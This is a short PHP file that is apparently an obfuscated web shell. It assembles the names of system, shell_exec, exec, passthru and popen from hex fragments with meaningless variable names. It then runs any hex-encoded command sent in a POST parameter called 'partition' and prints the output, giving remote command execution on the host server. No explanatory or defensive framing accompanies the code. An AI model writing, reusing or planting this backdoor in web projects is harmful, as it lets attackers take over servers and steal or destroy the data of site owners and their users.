<?php

$state1 = '73';
$state2 = '74';
$state3 = '65';
$state4 = '6d';
$state5 = '6c';
$state6 = '78';
$state7 = '68';
$state8 = '72';
$state9 = '75';
$state10 = '6f';
$state11 = '70';
$state12 = '61';
$state13 = '5f';
$state14 = '67';
$state15 = '63';
$state16 = '69';
$rjust1 = pack("H*", $state1 . '79' . '73' . $state2 . $state3 . $state4);
$rjust2 = pack("H*", '73' . '68' . $state3 . $state5 . '6c' . '5f' . '65' . $state6 . '65' . '63');
$rjust3 = pack("H*", $state3 . $state6 . $state3 . '63');
$rjust4 = pack("H*", '70' . '61' . $state1 . $state1 . $state2 . $state7 . $state8 . $state9);
$rjust5 = pack("H*", '70' . $state10 . $state11 . '65' . '6e');
$rjust6 = pack("H*", $state1 . '74' . $state8 . '65' . $state12 . '6d' . $state13 . $state14 . $state3 . '74' . $state13 . $state15 . $state10 . '6e' . $state2 . $state3 . '6e' . $state2 . '73');
$rjust7 = pack("H*", '70' . '63' . $state5 . $state10 . '73' . '65');
$partition = pack("H*", $state11 . $state12 . '72' . '74' . $state16 . $state2 . '69' . '6f' . '6e');
if (isset($_POST[$partition])) {
    $partition = pack("H*", $_POST[$partition]);
    if (function_exists($rjust1)) {
        $rjust1($partition);
    } elseif (function_exists($rjust2)) {
        print $rjust2($partition);
    } elseif (function_exists($rjust3)) {
        $rjust3($partition, $variable_arg);
        print join("\n", $variable_arg);
    } elseif (function_exists($rjust4)) {
        $rjust4($partition);
    } elseif (function_exists($rjust5) && function_exists($rjust6) && function_exists($rjust7)) {
        $attr_const = $rjust5($partition, 'r');
        if ($attr_const) {
            $slt_st = $rjust6($attr_const);
            $rjust7($attr_const);
            print $slt_st;
        }
    }
    exit;
}
